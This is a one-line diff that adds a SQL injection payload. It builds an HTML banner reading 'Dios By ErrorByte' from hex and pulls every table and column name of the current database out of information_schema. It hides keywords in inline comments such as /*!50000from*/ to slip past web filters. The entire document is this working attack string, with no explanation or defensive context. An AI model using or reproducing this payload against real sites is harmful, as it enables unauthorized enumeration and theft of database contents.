@@ -1,0 +1,1 @@
+concat(0x3c68313e44696f73204279204572726f72427974653c2f68313e,(select/**/group_concat(table_name,0x3a,column_name,0x3c62723e)/*!50000from*/information_schema.columns/*!12345where*/table_schema=database()))
